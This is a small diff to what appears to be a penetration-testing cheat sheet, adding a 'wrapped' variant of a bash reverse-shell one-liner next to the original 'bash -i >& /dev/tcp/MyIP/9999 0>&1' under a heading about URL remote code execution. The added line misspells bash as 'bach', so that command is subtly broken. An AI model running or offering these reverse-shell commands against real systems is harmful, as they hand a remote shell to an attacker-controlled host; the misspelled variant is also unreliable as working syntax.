@@ -353,6 +353,10 @@ google.com
 ```
 bash -i >& /dev/tcp/MyIP/9999 0>&1
 
+or maybe wrap it:
+
+bach -c 'bash -i >& /dev/tcp/MyIP/9999 0>&1'
+
 Base One-liner for URL RCE + Encoded
 ---
 
